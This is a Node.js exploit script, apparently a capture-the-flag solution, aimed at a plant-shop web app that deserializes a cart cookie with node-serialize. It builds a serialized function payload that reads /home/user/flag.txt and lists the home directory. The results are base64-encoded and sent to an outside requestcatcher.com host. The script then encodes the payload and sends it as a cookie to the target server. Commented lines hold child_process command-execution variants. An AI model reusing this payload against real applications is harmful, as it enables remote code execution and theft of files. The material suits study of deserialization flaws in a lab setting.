// flag in 
// flag{seriously_deserialization_with_plants}

// npm install node-serialize
var serialize = require('node-serialize');
var urlencode = require('urlencode');

// innocent={"items":{"0":{"name":"Haworthiopsis attenuata","price":19.99,"count":1},"2":{"name":"Dracaena trifasciata","price":14.99,"count":1}}}
// var obj = serialize.unserialize(innocent);

// console.log(obj);
// console.log(obj.items[0].name);

// Plan
// obj.items[0].name = function(){
// require('child_process').exec('ls / > nep10.txt', function(error, stdout, stderr) { return stdout; });
// }();

evil = {
  items: {
    '0': { name: 'Haworthiopsis attenuata', price: 19.99, count: 1 },
    '2': { name: 'Dracaena trifasciata', price: 14.99, count: 1 },
    '3': { name: function(){
			require('child_process').exec('ls / >> nep10.txt', function(error, stdout, stderr) { return 'Neptunian'; });
		}, 
    	price: 14.99, count: 1,  },
  }
}

evil2 = {
  items: {
    '0': { name: 'Haworthiopsis attenuata', price: 19.99, count: 1 },
    '2': { name: 'Dracaena trifasciata', price: 14.99, count: 1 },
    '3': { name: function(){

    		mysite = 'https://neptunian147.requestcatcher.com';

    		require('request')(mysite - '/working', function (error, response, body) { console.log(body); });

    		var fs = require('fs');
    		fs.readFile('/home/user/flag.txt', function(err, data) {
    			let base64flag = Buffer.from(data).toString('base64');

			    require('request')(mysite + '/working?flag=' + base64flag, function (error, response, body) { console.log(body); });
			  });

			const path = require('path');
			//joining path of directory 
			// require('path').dirname(require.main.filename)''; //__dirname
			const directoryPath =  '/home/user';
			//passsing directoryPath and callback function
			fs.readdir(directoryPath, function (err, files) {
			    //handling error
			    if (err) {
			        return console.log('Unable to scan directory: ' + err);
			        require('request')(mysite + '/shitt-happens', function (error, response, body) { console.log(body); });
			    } 

			    //listing all files using forEach
			    files.forEach(function (file) {
			        // Do whatever you want to do with the file
			        console.log(file); 

			        require('request')(mysite + '/store2?file=' + file, function (error, response, body) { console.log(body); });
			    });
			});},price: 14.99, count: 1,  },
  }
};

// serious_evil=serialize.serialize(evil);

// command = 'ls -l / > /tmp/nep10.txt';
// returning = "require('request')('https://neptunian.requestcatcher.com/working', function (error, response, body) { console.log(body); });";

// unevil = '{"items":{"0":{"name":"Haworthiopsis attenuata","price":19.99,"count":1},"1":{"name":"Dracaena trifasciata","price":14.99,"count":1},"2":{"name":"_$$ND_FUNC$$_function(){ require(\'child_process\').exec(\'' + command + '\', function(error, stdout, stderr) { ' + returning + ' });}()","price":14.99,"count":1}}}';

let buff = new Buffer.from(serialize.serialize(evil2));

console.log('Evil Serialized:');
// buff2 = buff.toString('ascii');
buff2 = buff.toString('ascii').replace('}","price', '}()","price');
console.log(buff2 + '\n\n');

console.log('Evil Base64');
let base64data = Buffer.from(buff2).toString('base64');
console.log(base64data + '\n\n');

console.log('Evil URL Encoded:');
let payload = urlencode(base64data);
console.log(payload + '\n\n');
// console.log(serious_evil);
// console.log(obj.items[0].name);

// target_un = serialize.unserialize(buff2);

// console.log('Check');

// console.log(target_un.items['3'].name);


var request = require('request');

var headers = {
    'Connection': 'keep-alive',
    'Pragma': 'no-cache',
    'Cache-Control': 'no-cache',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Referer': 'http://two.jh2i.com:50007/item/Dracaena%20trifasciata',
    'Accept-Language': 'en-US,en;q=0.9,pt-BR;q=0.8,pt;q=0.7,es;q=0.6,fr;q=0.5',
    'Cookie': 'cart=' + payload
    //'Cookie': 'cart=eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24oKXtyZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYygnY3VybCBodHRwczovL25lcHR1bmlhbi5yZXF1ZXN0Y2F0Y2hlci5jb20vdGVzdCcsIGZ1bmN0aW9uKGVycm9yLCBzdGRvdXQsIHN0ZGVycikgeyBjb25zb2xlLmxvZyhzdGRvdXQpIH0pOyB9In0%3D'
};

var options = {
    url: 'http://two.jh2i.com:50007/cart',
    headers: headers
};

function callback(error, response, body) {
    if (!error && response.statusCode == 200) {
        console.log(body);
        require('fs').writeFile('out.html', body,
        		function (err) {

        		}
        	);
    }
}

request(options, callback);
